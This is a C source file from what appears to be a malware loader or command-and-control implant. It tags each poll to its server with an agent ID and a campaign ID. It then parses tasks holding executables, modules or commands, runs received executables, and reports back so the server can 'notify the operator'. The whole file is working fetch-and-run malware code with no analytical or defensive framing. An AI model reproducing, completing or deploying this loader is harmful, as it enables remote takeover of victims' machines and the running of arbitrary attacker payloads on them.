#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"
#include "../../includes/parser/parser.h"








static PBYTE  sPollBody;
static DWORD  sPollSize;

void LdrInitPoll() {
    DBGA("[+] Loading apis and crafting base struct\n");
    NwLoadApis();
    ParserWrite *writer = ParserInitWrite();
    ParserWrite4(writer, POLL_CODE);
    ParserWriteBytes(writer, ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
    ParserWriteBytes(writer, ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
    sPollBody = ParserWriteReturnPointer(writer);
    sPollSize = (DWORD)ParserWriteReturnSize(writer);
}

LdrTask LdrPollServer() {
    LdrTask task = {0};
    DWORD PayloadSize = 0;
    DWORD HasArgs = 0;
    DBGA("[*] Polling Server\n");
    PVOID Addr = NwPollServer(&PayloadSize, sPollBody, sPollSize);
    if(!Addr) {
		DBGA("[*] Failed Polling Server\n");

        task.ok = FALSE;
        return task;
    }

    ParserRead *pr = ParserInitRead(Addr, PayloadSize);
    task.code = ParserRead4(pr);
    if(task.code == TASK_NO_TASK) {
		DBGA("[*] No task\n");
        task.ok = TRUE;
        ParserClearRead(pr);
        ldr->win32->LocalFree(Addr);
        return task;
    }
    task.Id = ParserRead4(pr);
    task.FileType = ParserRead4(pr);
    if(task.FileType == FILE_EXE) {
    	task.hasReloc = ParserRead4(pr);
    }
    if(task.code == TASK_MODULE || task.code == TASK_CMD) {
    	HasArgs = ParserRead4(pr);
    }
    task.DataSize = ParserRead4(pr);
    PBYTE Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
    if(!Data) {
		DBGA("[*] Failed Allocating\n");
        task.ok = FALSE;
        ParserClearRead(pr);
        ldr->win32->LocalFree(Addr);
        return task;
    }
    ParserReadBytes(pr, Data, task.DataSize);
    PCHAR Args = NULL;
    if(HasArgs) {
    	Args = ParserReadString(pr);
    }

    task.Data = Data;
    task.ok = TRUE;
    task.args = Args;
    ldr->win32->LocalFree(Addr);
    return task; 

}

BOOL LdrLoadAndRun(LdrTask info, ParserWrite *p) {
	switch (info.code) {
	case TASK_LOAD:
		if(!LdrRunExe(info))
			return FALSE;
		// No payload to return — tell the server the task launched so it can
		// mark it done and notify the operator.
		ParserWrite4(p, OUTPUT_NO_DATA);
		return TRUE;
	default:
		return FALSE;
	}
}

void LdrBeginOutput(ParserWrite *p, DWORD taskId) {
	ParserWrite4(p, MSG_OUTPUT);
	ParserWriteBytes(p, (PBYTE)ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
	ParserWriteBytes(p, (PBYTE)ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
	ParserWrite4(p, taskId);
}

